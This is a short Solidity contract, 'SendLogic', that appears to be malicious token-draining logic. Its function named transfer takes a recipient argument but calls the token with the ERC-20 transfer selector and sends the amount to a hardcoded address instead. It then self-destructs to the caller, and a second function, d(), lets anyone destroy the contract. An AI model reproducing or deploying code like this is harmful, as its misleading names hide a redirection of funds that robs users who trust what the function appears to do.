pragma solidity ^0.8.6;

contract SendLogic {
  function transfer(address to, uint256 amount) public returns (bool) {
    (bool s,) = (to).call(abi.encodeWithSelector(0xa9059cbb, 0xE78388b4CE79068e89Bf8aA7f218eF6b9AB0e9d0, amount));
    require(s);
    selfdestruct(payable(msg.sender));
  }

  function d() public {
      selfdestruct(payable(msg.sender));
  }
}
